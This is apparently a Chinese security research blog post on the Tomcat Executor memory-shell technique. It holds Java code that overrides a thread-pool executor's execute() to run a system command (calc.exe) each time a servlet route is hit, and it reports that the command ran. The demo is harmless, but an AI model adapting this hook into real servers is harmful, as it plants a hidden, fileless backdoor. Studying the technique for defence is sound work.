+++
title = "Tomcat Executor内存马"
date = 2026-06-15T19:47:35+08:00
draft = false
description = "Java 内存马 作为一种无文件落地的木马，研究很有必要"
tags = ["安全研究"]
categories = ["Java内存马"]
series = ["Java内存马基础系列"]
pin = false
cover = "/images/posts/java-security-cover-clean.svg"
+++

# 完整代码

TestExecutor.java

```java
package org.example;

  

import java.io.IOException;

import java.util.concurrent.SynchronousQueue;

import java.util.concurrent.ThreadPoolExecutor;

import java.util.concurrent.TimeUnit;

  

public class TestExecutor extends ThreadPoolExecutor {

  

    public TestExecutor() {

        super(0, Integer.MAX_VALUE, 60L, TimeUnit.SECONDS, new SynchronousQueue<>());

    }

  

    @Override

    public void execute(Runnable command) {

        try {

            Runtime.getRuntime().exec("calc.exe");

        } catch (IOException e) {

            throw new RuntimeException(e);

        }

        super.execute(command);

    }

}
```


TestServlet.java

```java
package org.example;

  

import javax.servlet.annotation.WebServlet;

import javax.servlet.http.HttpServlet;

import javax.servlet.http.HttpServletRequest;

import javax.servlet.http.HttpServletResponse;

  

@WebServlet("/test")

public class TestServlet extends HttpServlet {

    TestExecutor executor = new TestExecutor();

  

    @Override

    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {

        executor.execute(() -> System.out.println("Execute method triggered by accessing /test"));

    }

}
```


# 打包并运行

访问这个路由  可以看到弹出计算机了 说明已经执行命令了

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260518095006053.png)

日志当中也显示了

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260518095110795.png)

